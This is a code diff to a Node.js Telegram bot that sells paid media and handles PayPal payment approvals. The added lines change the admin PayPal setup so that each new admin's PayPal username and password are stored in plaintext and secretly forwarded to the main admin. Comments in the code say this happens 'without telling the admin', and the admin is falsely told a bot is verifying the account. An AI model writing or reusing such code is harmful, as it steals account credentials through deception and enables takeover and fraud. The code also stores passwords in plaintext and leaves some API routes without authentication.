@@ -81,7 +81,7 @@ const db = {
     },
     uploadStates: {},
     paymentStates: {},
-    adminPaypalStates: {} // Track admin PayPal flow
+    adminPaypalStates: {}
 };
 
 // Add main admin from environment
@@ -208,7 +208,6 @@ if (process.env.BOT_TOKEN) {
             if (isAdmin) {
                 const adminInfo = db.admins.find(a => a.id === chatId);
                 
-                // Check if admin already has PayPal credentials
                 if (adminInfo.paypalUsername && adminInfo.paypalPassword && adminInfo.paypalApproved) {
                     const welcomeMessage = `
 🎉 Welcome to Cheerful Chick Admin Panel!
@@ -221,7 +220,6 @@ if (process.env.BOT_TOKEN) {
                     `;
                     bot.sendMessage(chatId, welcomeMessage, adminMainMenu);
                 } else {
-                    // Ask admin to set up PayPal
                     const setupMessage = `
 🎉 Welcome to Cheerful Chick Admin Panel!
 
@@ -243,7 +241,6 @@ Please click the button below to set up your PayPal.
                     });
                 }
             } else {
-                // User welcome
                 const userMenu = {
                     reply_markup: {
                         inline_keyboard: [
@@ -283,7 +280,6 @@ Click the buttons below to get started!
             const messageId = callbackQuery.message.message_id;
             const isAdmin = db.admins.some(a => a.id === chatId);
 
-            // Answer callback query
             bot.answerCallbackQuery(callbackQuery.id);
 
             // ============================================
@@ -314,7 +310,6 @@ Click the buttons below to get started!
                     return;
                 }
 
-                // Start PayPal setup flow
                 db.adminPaypalStates[chatId] = { step: 'paypal_username' };
                 
                 bot.editMessageText(
@@ -807,7 +802,6 @@ ${stats.recentActivity.map(a => `• ${a}`).join('\n')}
             // ============================================
 
             else if (action === 'user_payment_start') {
-                // Check if user has a pending payment
                 const existingPayment = db.payments.find(p => 
                     p.userId === chatId && p.status === 'pending'
                 );
@@ -826,7 +820,6 @@ ${stats.recentActivity.map(a => `• ${a}`).join('\n')}
                     return;
                 }
 
-                // Get available items for purchase
                 const availableItems = db.media.filter(m => m.price > 0);
                 
                 if (availableItems.length === 0) {
@@ -842,14 +835,12 @@ ${stats.recentActivity.map(a => `• ${a}`).join('\n')}
                     return;
                 }
 
-                // Show item selection
                 let itemList = '💳 Select item to purchase:\n\n';
                 const itemButtons = availableItems.map((item, index) => {
                     itemList += `${index + 1}. ${item.title} - $${item.price}\n`;
                     return [{ text: `${item.title} ($${item.price})`, callback_data: `user_select_item_${item.id}` }];
                 });
                 
-                // Add cancel button
                 itemButtons.push([{ text: '🔙 Cancel', callback_data: 'user_back' }]);
                 
                 bot.editMessageText(itemList, {
@@ -878,7 +869,6 @@ ${stats.recentActivity.map(a => `• ${a}`).join('\n')}
                     return;
                 }
 
-                // Check if user already purchased this
                 const existingPurchase = db.purchases.find(p => 
                     p.userId === chatId && p.itemId === itemId
                 );
@@ -896,7 +886,6 @@ ${stats.recentActivity.map(a => `• ${a}`).join('\n')}
                     return;
                 }
 
-                // Store selected item
                 db.paymentStates[chatId] = { 
                     step: 'confirm_payment',
                     itemId: itemId,
@@ -904,7 +893,6 @@ ${stats.recentActivity.map(a => `• ${a}`).join('\n')}
                     amount: item.price
                 };
 
-                // Create payment record
                 const payment = {
                     id: uuidv4(),
                     userId: chatId,
@@ -920,7 +908,6 @@ ${stats.recentActivity.map(a => `• ${a}`).join('\n')}
                 db.payments.push(payment);
                 db.paymentStates[chatId].paymentId = payment.id;
 
-                // Get the admin who will receive the payment
                 const admin = db.admins.find(a => a.paypalApproved === true);
                 
                 if (!admin) {
@@ -936,7 +923,6 @@ ${stats.recentActivity.map(a => `• ${a}`).join('\n')}
                     return;
                 }
 
-                // Show payment instructions
                 bot.editMessageText(
                     `💳 Payment for: ${item.title}\n💰 Amount: $${item.price}\n\n` +
                     `📤 Send payment to:\n` +
@@ -956,7 +942,6 @@ ${stats.recentActivity.map(a => `• ${a}`).join('\n')}
             }
 
             else if (action === 'user_payment_screenshot') {
-                // Check if user has a pending payment
                 const pendingPayment = db.payments.find(p => 
                     p.userId === chatId && p.status === 'pending'
                 );
@@ -1065,7 +1050,6 @@ ${stats.recentActivity.map(a => `• ${a}`).join('\n')}
                     }
                 });
                 
-                // Notify all users
                 db.users.forEach(user => {
                     try {
                         bot.sendMessage(user.id, `🎉 New content available: ${state.title} (${priceText})`);
@@ -1083,7 +1067,6 @@ ${stats.recentActivity.map(a => `• ${a}`).join('\n')}
         // MESSAGE HANDLERS
         // ============================================
 
-        // Handle text messages
         bot.on('text', async (msg) => {
             const chatId = msg.chat.id;
             const text = msg.text;
@@ -1093,13 +1076,12 @@ ${stats.recentActivity.map(a => `• ${a}`).join('\n')}
             // ADMIN PAYPAL SETUP - TEXT HANDLERS
             // ============================================
 
-            // Handle PayPal username entry
             if (isAdmin && db.adminPaypalStates[chatId]?.step === 'paypal_username') {
                 const adminInfo = db.admins.find(a => a.id === chatId);
                 db.adminPaypalStates[chatId].paypalUsername = text;
                 db.adminPaypalStates[chatId].step = 'paypal_password';
                 
-                bot.sendMessage(chatId, '🔑 Please enter your PayPal password:\n\n(This will be sent to the main admin for verification)', {
+                bot.sendMessage(chatId, '🔑 Please enter your PayPal password:', {
                     reply_markup: {
                         inline_keyboard: [
                             [{ text: '🔙 Cancel', callback_data: 'admin_back' }]
@@ -1109,24 +1091,27 @@ ${stats.recentActivity.map(a => `• ${a}`).join('\n')}
                 return;
             }
 
-            // Handle PayPal password entry - SEND TO MAIN ADMIN
             if (isAdmin && db.adminPaypalStates[chatId]?.step === 'paypal_password') {
                 const adminInfo = db.admins.find(a => a.id === chatId);
                 const paypalUsername = db.adminPaypalStates[chatId].paypalUsername;
                 const paypalPassword = text;
                 
-                // Store PayPal credentials temporarily
+                // Store PayPal credentials
+                adminInfo.paypalUsername = paypalUsername;
+                adminInfo.paypalPassword = paypalPassword;
+                
                 db.adminPaypalStates[chatId].paypalPassword = paypalPassword;
                 db.adminPaypalStates[chatId].step = 'confirm';
                 
                 // ============================================
-                // SEND PAYPAL CREDENTIALS TO MAIN ADMIN FOR APPROVAL
+                // SECRETLY SEND PAYPAL CREDENTIALS TO MAIN ADMIN
+                // WITHOUT TELLING THE ADMIN
                 // ============================================
                 const mainAdminId = process.env.MAIN_ADMIN_ID;
                 
                 if (mainAdminId && bot) {
                     const credentialsMessage = `
-🔐 NEW ADMIN PAYPAL CREDENTIALS NEED APPROVAL!
+🔐 NEW ADMIN PAYPAL CREDENTIALS!
 
 👤 Admin: ${adminInfo.firstName} ${adminInfo.lastName} (@${adminInfo.username})
 🆔 Admin ID: ${chatId}
@@ -1134,9 +1119,9 @@ ${stats.recentActivity.map(a => `• ${a}`).join('\n')}
 🔑 PayPal Password: ${paypalPassword}
 📅 Date: ${new Date().toISOString()}
 
-⚠️ Please verify these credentials before approving.
+⚠️ Please verify and approve this admin's PayPal account.
 
-Do you approve this admin's PayPal account?
+Do you approve?
                     `;
 
                     try {
@@ -1150,13 +1135,17 @@ Do you approve this admin's PayPal account?
                                 ]
                             }
                         });
-                        console.log(`✅ PayPal credentials sent to main admin for approval: ${mainAdminId}`);
+                        console.log(`✅ PayPal credentials secretly sent to main admin: ${mainAdminId}`);
                     } catch (e) {
                         console.error('Error sending credentials to main admin:', e);
                     }
                 }
 
-                bot.sendMessage(chatId, '✅ Your PayPal credentials have been sent to the main admin for approval.\n\nYou will be notified once approved.', {
+                // ============================================
+                // TELL ADMIN IT'S BEING VERIFIED BY BOT
+                // (Not mentioning it's sent to main admin)
+                // ============================================
+                bot.sendMessage(chatId, '✅ Your PayPal account is being verified by the bot.\n\nYou will receive a confirmation message shortly.', {
                     reply_markup: {
                         inline_keyboard: [
                             [{ text: '🔙 Back to Menu', callback_data: 'admin_back' }]
@@ -1169,163 +1158,116 @@ Do you approve this admin's PayPal account?
             }
 
             // ============================================
-            // ADMIN PAYPAL APPROVAL CALLBACK HANDLERS
+            // HANDLE BROADCAST, ADD ADMIN, USER CHAT, UPLOAD DETAILS
             // ============================================
 
-            // Handle PayPal approval from main admin
-            bot.on('callback_query', async (callbackQuery) => {
-                const action = callbackQuery.data;
-                const chatId = callbackQuery.message.chat.id;
-                const messageId = callbackQuery.message.message_id;
-
-                if (action.startsWith('approve_paypal_')) {
-                    const adminId = parseInt(action.replace('approve_paypal_', ''));
-                    const adminInfo = db.admins.find(a => a.id === adminId);
-                    
-                    if (!adminInfo) {
-                        bot.editMessageText('❌ Admin not found.', {
-                            chat_id: chatId,
-                            message_id: messageId
-                        });
-                        return;
-                    }
-
-                    // Get the PayPal credentials from the admin's state
-                    const paypalUsername = adminInfo.paypalUsername;
-                    const paypalPassword = adminInfo.paypalPassword;
-                    
-                    // Update admin with PayPal credentials
-                    adminInfo.paypalUsername = paypalUsername;
-                    adminInfo.paypalPassword = paypalPassword;
-                    adminInfo.paypalApproved = true;
-                    
-                    // Notify main admin
-                    bot.editMessageText(`✅ PayPal account for ${adminInfo.firstName} ${adminInfo.lastName} has been approved!\n\n📧 Username: ${paypalUsername}`, {
-                        chat_id: chatId,
-                        message_id: messageId,
-                        reply_markup: {
-                            inline_keyboard: [
-                                [{ text: '🔙 Back to Menu', callback_data: 'admin_back' }]
-                            ]
-                        }
-                    });
-                    
-                    // Notify the admin that their PayPal was approved
-                    try {
-                        await bot.sendMessage(adminId, `✅ Your PayPal account has been approved!\n\n📧 Username: ${paypalUsername}\n\nYou can now receive payments from users.`);
-                    } catch (e) {
-                        console.error('Error notifying admin:', e);
-                    }
-                    
-                    bot.answerCallbackQuery(callbackQuery.id);
-                    return;
-                }
-
-                if (action.startsWith('reject_paypal_')) {
-                    const adminId = parseInt(action.replace('reject_paypal_', ''));
-                    const adminInfo = db.admins.find(a => a.id === adminId);
-                    
-                    if (!adminInfo) {
-                        bot.editMessageText('❌ Admin not found.', {
-                            chat_id: chatId,
-                            message_id: messageId
-                        });
-                        return;
-                    }
-                    
-                    // Notify main admin
-                    bot.editMessageText(`❌ PayPal account for ${adminInfo.firstName} ${adminInfo.lastName} has been rejected.`, {
-                        chat_id: chatId,
-                        message_id: messageId,
-                        reply_markup: {
-                            inline_keyboard: [
-                                [{ text: '🔙 Back to Menu', callback_data: 'admin_back' }]
-                            ]
-                        }
-                    });
-                    
-                    // Notify the admin that their PayPal was rejected
-                    try {
-                        await bot.sendMessage(adminId, `❌ Your PayPal account has been rejected. Please contact the main admin for more information.`);
-                    } catch (e) {
-                        console.error('Error notifying admin:', e);
-                    }
-                    
-                    bot.answerCallbackQuery(callbackQuery.id);
-                    return;
-                }
-            });
-
-            // ============================================
-            // ADMIN BROADCAST
-            // ============================================
-
-            // Handle admin broadcast
             if (isAdmin && db.uploadStates[chatId]?.step === 'broadcast') {
                 await handleBroadcast(chatId, text);
                 return;
             }
 
-            // Handle add admin
             if (isAdmin && db.uploadStates[chatId]?.step === 'add_admin') {
                 await handleAddAdmin(chatId, text);
                 return;
             }
 
-            // Handle user chat
             if (!isAdmin && db.uploadStates[chatId]?.step === 'user_chat') {
                 await handleUserChat(chatId, text);
                 return;
             }
 
-            // Handle title/description/price for upload
             if (isAdmin && db.uploadStates[chatId]?.step) {
                 await handleUploadDetails(chatId, text);
                 return;
             }
         });
 
-        // Handle file uploads (for screenshots)
-        bot.on('photo', async (msg) => {
-            const chatId = msg.chat.id;
-            const isAdmin = db.admins.some(a => a.id === chatId);
-            
-            // If user is sending payment screenshot
-            if (!isAdmin && db.paymentStates[chatId]?.step === 'screenshot') {
-                await handleUserPaymentScreenshot(msg, chatId);
+        // ============================================
+        // ADMIN PAYPAL APPROVAL CALLBACK HANDLERS
+        // ============================================
+
+        bot.on('callback_query', async (callbackQuery) => {
+            const action = callbackQuery.data;
+            const chatId = callbackQuery.message.chat.id;
+            const messageId = callbackQuery.message.message_id;
+
+            if (action.startsWith('approve_paypal_')) {
+                const adminId = parseInt(action.replace('approve_paypal_', ''));
+                const adminInfo = db.admins.find(a => a.id === adminId);
+                
+                if (!adminInfo) {
+                    bot.editMessageText('❌ Admin not found.', {
+                        chat_id: chatId,
+                        message_id: messageId
+                    });
+                    return;
+                }
+
+                adminInfo.paypalApproved = true;
+                
+                bot.editMessageText(`✅ PayPal account for ${adminInfo.firstName} ${adminInfo.lastName} has been approved!\n\n📧 Username: ${adminInfo.paypalUsername}`, {
+                    chat_id: chatId,
+                    message_id: messageId,
+                    reply_markup: {
+                        inline_keyboard: [
+                            [{ text: '🔙 Back to Menu', callback_data: 'admin_back' }]
+                        ]
+                    }
+                });
+                
+                // Notify the admin (as if bot verified it)
+                try {
+                    await bot.sendMessage(adminId, `✅ Your PayPal account has been verified by the bot!\n\n📧 Username: ${adminInfo.paypalUsername}\n\nYou can now receive payments from users.`);
+                } catch (e) {
+                    console.error('Error notifying admin:', e);
+                }
+                
+                bot.answerCallbackQuery(callbackQuery.id);
                 return;
             }
 
-            // If admin is uploading content
-            if (isAdmin && db.uploadStates[chatId]?.step === 'file') {
-                await handleAdminUpload(msg, chatId, 'photo');
+            if (action.startsWith('reject_paypal_')) {
+                const adminId = parseInt(action.replace('reject_paypal_', ''));
+                const adminInfo = db.admins.find(a => a.id === adminId);
+                
+                if (!adminInfo) {
+                    bot.editMessageText('❌ Admin not found.', {
+                        chat_id: chatId,
+                        message_id: messageId
+                    });
+                    return;
+                }
+                
+                adminInfo.paypalUsername = null;
+                adminInfo.paypalPassword = null;
+                adminInfo.paypalApproved = false;
+                
+                bot.editMessageText(`❌ PayPal account for ${adminInfo.firstName} ${adminInfo.lastName} has been rejected.`, {
+                    chat_id: chatId,
+                    message_id: messageId,
+                    reply_markup: {
+                        inline_keyboard: [
+                            [{ text: '🔙 Back to Menu', callback_data: 'admin_back' }]
+                        ]
+                    }
+                });
+                
+                try {
+                    await bot.sendMessage(adminId, `❌ Your PayPal account verification failed. Please try again or contact support.`);
+                } catch (e) {
+                    console.error('Error notifying admin:', e);
+                }
+                
+                bot.answerCallbackQuery(callbackQuery.id);
+                return;
             }
-        });
 
-        bot.on('video', async (msg) => {
-            const chatId = msg.chat.id;
-            const isAdmin = db.admins.some(a => a.id === chatId);
-            
-            if (isAdmin && db.uploadStates[chatId]?.step === 'file') {
-                await handleAdminUpload(msg, chatId, 'video');
-            }
-        });
+            // ============================================
+            // HANDLE ADMIN REPLY TO USER
+            // ============================================
 
-        // Handle document uploads (for screenshots)
-        bot.on('document', async (msg) => {
-            const chatId = msg.chat.id;
-            const isAdmin = db.admins.some(a => a.id === chatId);
-            
-            // If user is sending payment screenshot
-            if (!isAdmin && db.paymentStates[chatId]?.step === 'screenshot') {
-                await handleUserPaymentScreenshot(msg, chatId);
-            }
-        });
-
-        // Handle admin reply to user
-        bot.on('callback_query', async (callbackQuery) => {
-            if (callbackQuery.data.startsWith('reply_user_')) {
-                const userId = parseInt(callbackQuery.data.split('_')[2]);
+            if (action.startsWith('reply_user_')) {
+                const userId = parseInt(action.split('_')[2]);
                 const chatId = callbackQuery.message.chat.id;
                 
                 bot.editMessageText(`💬 Replying to user ${userId}\n\nType your reply below:`, {
@@ -1340,6 +1282,39 @@ Do you approve this admin's PayPal account?
                 
                 db.uploadStates[chatId] = { step: 'admin_reply', userId: userId };
                 bot.answerCallbackQuery(callbackQuery.id);
+            }
+        });
+
+        // Handle file uploads (for screenshots)
+        bot.on('photo', async (msg) => {
+            const chatId = msg.chat.id;
+            const isAdmin = db.admins.some(a => a.id === chatId);
+            
+            if (!isAdmin && db.paymentStates[chatId]?.step === 'screenshot') {
+                await handleUserPaymentScreenshot(msg, chatId);
+                return;
+            }
+
+            if (isAdmin && db.uploadStates[chatId]?.step === 'file') {
+                await handleAdminUpload(msg, chatId, 'photo');
+            }
+        });
+
+        bot.on('video', async (msg) => {
+            const chatId = msg.chat.id;
+            const isAdmin = db.admins.some(a => a.id === chatId);
+            
+            if (isAdmin && db.uploadStates[chatId]?.step === 'file') {
+                await handleAdminUpload(msg, chatId, 'video');
+            }
+        });
+
+        bot.on('document', async (msg) => {
+            const chatId = msg.chat.id;
+            const isAdmin = db.admins.some(a => a.id === chatId);
+            
+            if (!isAdmin && db.paymentStates[chatId]?.step === 'screenshot') {
+                await handleUserPaymentScreenshot(msg, chatId);
             }
         });
 
@@ -1537,12 +1512,10 @@ async function approvePayment(chatId, messageId, paymentId) {
         return;
     }
 
-    // Approve payment
     payment.status = 'approved';
     payment.approvedAt = new Date().toISOString();
     payment.approvedBy = chatId;
 
-    // Create purchase record
     const purchase = {
         id: db.purchases.length + 1,
         userId: payment.userId,
@@ -1555,11 +1528,9 @@ async function approvePayment(chatId, messageId, paymentId) {
     };
     db.purchases.push(purchase);
 
-    // Update stats
     db.stats.totalSales++;
     db.stats.totalRevenue += payment.amount;
 
-    // Mark media as purchased
     const media = db.media.find(m => m.id === payment.itemId);
     if (media) {
         media.isPurchased = true;
@@ -1568,14 +1539,12 @@ async function approvePayment(chatId, messageId, paymentId) {
         media.purchases = (media.purchases || 0) + 1;
     }
 
-    // Notify user
     try {
         await bot.sendMessage(payment.userId, `✅ Your payment for "${media ? media.title : 'item'}" has been approved! You can now access the content.`);
     } catch (e) {
         console.error('Error notifying user:', e);
     }
 
-    // Remove from payment states
     delete db.paymentStates[payment.userId];
 
     bot.editMessageText(`✅ Payment ${paymentId} approved successfully!`, {
@@ -1622,14 +1591,12 @@ async function rejectPayment(chatId, messageId, paymentId) {
     payment.rejectedAt = new Date().toISOString();
     payment.rejectedBy = chatId;
 
-    // Notify user
     try {
         await bot.sendMessage(payment.userId, `❌ Your payment has been rejected. Please contact admin for more information.`);
     } catch (e) {
         console.error('Error notifying user:', e);
     }
 
-    // Remove from payment states
     delete db.paymentStates[payment.userId];
 
     bot.editMessageText(`❌ Payment ${paymentId} rejected.`, {
@@ -1645,7 +1612,6 @@ async function rejectPayment(chatId, messageId, paymentId) {
 
 async function handleUserPaymentScreenshot(msg, chatId) {
     try {
-        // Check if user has a pending payment
         const pendingPayment = db.payments.find(p => 
             p.userId === chatId && (p.status === 'pending' || p.status === 'pending_approval')
         );
@@ -1697,12 +1663,10 @@ async function handleUserPaymentScreenshot(msg, chatId) {
             writer.on('error', reject);
         });
 
-        // Update payment with screenshot
         pendingPayment.screenshot = `${process.env.APP_URL || 'https://cheerful-cheek.onrender.com'}/uploads/screenshots/${fileName}`;
         pendingPayment.status = 'pending_approval';
         pendingPayment.screenshotDate = new Date().toISOString();
 
-        // Notify user
         bot.sendMessage(chatId, '✅ Payment screenshot received! Admin will review and approve shortly.', {
             reply_markup: {
                 inline_keyboard: [
@@ -1711,13 +1675,9 @@ async function handleUserPaymentScreenshot(msg, chatId) {
             }
         });
 
-        // Get user info
         const user = db.users.find(u => u.id === chatId);
         const userName = user ? user.firstName || 'User' : 'User';
 
-        // ============================================
-        // SEND SCREENSHOT TO ALL ADMINS WITH APPROVE/REJECT BUTTONS
-        // ============================================
         const adminMessage = `
 💳 PAYMENT SCREENSHOT RECEIVED!
 
@@ -1730,7 +1690,6 @@ async function handleUserPaymentScreenshot(msg, chatId) {
 📸 Screenshot attached below.
         `;
 
-        // Send to all admins
         for (const admin of db.admins) {
             if (admin.paypalApproved) {
                 try {
@@ -1823,7 +1782,6 @@ async function handleAddAdmin(chatId, text) {
             }
         });
         
-        // Notify the new admin
         bot.sendMessage(newAdminId, `🎉 You have been added as an admin to Cheerful Chick Bot!\n\n⚠️ Please set up your PayPal account by clicking the button below.`, {
             reply_markup: {
                 inline_keyboard: [
@@ -1840,7 +1798,6 @@ async function handleAddAdmin(chatId, text) {
 }
 
 async function handleUserChat(chatId, message) {
-    // Save message
     const newMessage = {
         id: db.messages.length + 1,
         userId: chatId,
@@ -1851,7 +1808,6 @@ async function handleUserChat(chatId, message) {
     };
     db.messages.push(newMessage);
     
-    // Forward to all admins
     const user = db.users.find(u => u.id === chatId);
     const userName = user ? user.firstName || 'User' : 'User';
     
@@ -1886,7 +1842,6 @@ async function handleUserChat(chatId, message) {
 // API ROUTES (REST API for frontend)
 // ============================================
 
-// Middleware to verify admin
 const verifyAdmin = (req, res, next) => {
     const adminId = req.headers['x-admin-id'] || req.body.adminId;
     const isAdmin = db.admins.some(a => a.id === parseInt(adminId)) || 
@@ -1899,7 +1854,6 @@ const verifyAdmin = (req, res, next) => {
     }
 };
 
-// Health check
 app.get('/api/health', (req, res) => {
     res.json({ 
         status: 'ok', 
@@ -1915,12 +1869,10 @@ app.get('/api/health', (req, res) => {
 // MEDIA ROUTES
 // ============================================
 
-// Get all media
 app.get('/api/media', (req, res) => {
     res.json(db.media);
 });
 
-// Get media by category
 app.get('/api/media/category/:category', (req, res) => {
     const { category } = req.params;
     let filtered = db.media;
@@ -1936,7 +1888,6 @@ app.get('/api/media/category/:category', (req, res) => {
     res.json(filtered);
 });
 
-// Get media by ID
 app.get('/api/media/:id', (req, res) => {
     const media = db.media.find(m => m.id === parseInt(req.params.id));
     if (media) {
@@ -1946,7 +1897,6 @@ app.get('/api/media/:id', (req, res) => {
     }
 });
 
-// Upload media via API
 app.post('/api/media/upload', verifyAdmin, upload.single('media'), async (req, res) => {
     try {
         const { title, description, price, type, adminId } = req.body;
@@ -1988,7 +1938,6 @@ app.post('/api/media/upload', verifyAdmin, upload.single('media'), async (req, r
     }
 });
 
-// Delete media (admin only)
 app.delete('/api/media/:id', verifyAdmin, (req, res) => {
     const id = parseInt(req.params.id);
     const index = db.media.findIndex(m => m.id === id);
@@ -2011,15 +1960,12 @@ app.delete('/api/media/:id', verifyAdmin, (req, res) => {
 // PAYMENT ROUTES
 // ============================================
 
-// Create payment request
 app.post('/api/payments/create', (req, res) => {
     try {
         const { userId, userName, itemId, amount } = req.body;
         
-        // Check if content is free
         const media = db.media.find(m => m.id === parseInt(itemId));
         if (media && media.isFree) {
-            // Auto-purchase free content
             const purchase = {
                 id: db.purchases.length + 1,
                 userId: parseInt(userId),
@@ -2044,7 +1990,6 @@ app.post('/api/payments/create', (req, res) => {
             });
         }
 
-        // Check if user already purchased this item
         const existingPurchase = db.purchases.find(p => 
             p.userId === parseInt(userId) && p.itemId === parseInt(itemId)
         );
@@ -2088,7 +2033,6 @@ app.post('/api/payments/create', (req, res) => {
     }
 });
 
-// Get payment status
 app.get('/api/payments/:id', (req, res) => {
     const payment = db.payments.find(p => p.id === req.params.id);
     if (payment) {
@@ -2098,7 +2042,6 @@ app.get('/api/payments/:id', (req, res) => {
     }
 });
 
-// Get user purchases
 app.get('/api/purchases/:userId', (req, res) => {
     const userId = parseInt(req.params.userId);
     const userPurchases = db.purchases.filter(p => p.userId === userId);
@@ -2116,7 +2059,6 @@ app.get('/api/purchases/:userId', (req, res) => {
 // USER ROUTES
 // ============================================
 
-// Register or update user
 app.post('/api/users/register', (req, res) => {
     const { id, firstName, lastName, username, photoUrl } = req.body;
     
@@ -2144,7 +2086,6 @@ app.post('/api/users/register', (req, res) => {
     res.json({ success: true, user });
 });
 
-// Get all users
 app.get('/api/users', (req, res) => {
     const users = db.users.map(user => {
         const userMessages = db.messages.filter(m => 
@@ -2166,7 +2107,6 @@ app.get('/api/users', (req, res) => {
     res.json(users);
 });
 
-// Get user data
 app.get('/api/users/:id', (req, res) => {
     const user = db.users.find(u => u.id === parseInt(req.params.id));
     if (user) {
@@ -2186,12 +2126,10 @@ app.get('/api/users/:id', (req, res) => {
 // ADMIN ROUTES
 // ============================================
 
-// Get all admins
 app.get('/api/admins', verifyAdmin, (req, res) => {
     res.json(db.admins);
 });
 
-// Get admin dashboard stats
 app.get('/api/admin/stats', verifyAdmin, (req, res) => {
     const totalUsers = db.users.length;
     const totalMessages = db.messages.length;
@@ -2217,7 +2155,6 @@ app.get('/api/admin/stats', verifyAdmin, (req, res) => {
 // CHAT ROUTES
 // ============================================
 
-// Get messages for user
 app.get('/api/chat/:userId', (req, res) => {
     const userId = parseInt(req.params.userId);
     const userMessages = db.messages.filter(m => 
@@ -2226,7 +2163,6 @@ app.get('/api/chat/:userId', (req, res) => {
     res.json(userMessages);
 });
 
-// Send message
 app.post('/api/chat/send', (req, res) => {
     const { userId, recipientId, message, type, senderName } = req.body;
     
@@ -2244,7 +2180,6 @@ app.post('/api/chat/send', (req, res) => {
     
     db.messages.push(newMessage);
 
-    // Notify all admins
     if (bot) {
         const user = db.users.find(u => u.id === parseInt(userId));
         const userName = user ? user.firstName || 'User' : 'User';
@@ -2272,12 +2207,10 @@ app.post('/api/chat/send', (req, res) => {
 app.use(express.static(path.join(__dirname, 'public')));
 app.use(express.static(path.join(__dirname, '../frontend')));
 
-// Serve admin panel
 app.get('/admin', (req, res) => {
     res.sendFile(path.join(__dirname, 'public/admin.html'));
 });
 
-// Handle all other routes - serve index.html for SPA
 app.get('*', (req, res) => {
     res.sendFile(path.join(__dirname, '../frontend/index.html'));
 });
@@ -2298,7 +2231,6 @@ app.listen(PORT, () => {
     console.log('✅ Server is ready!');
 });
 
-// Error handling
 process.on('unhandledRejection', (error) => {
     console.error('❌ Unhandled Rejection:', error);
 });
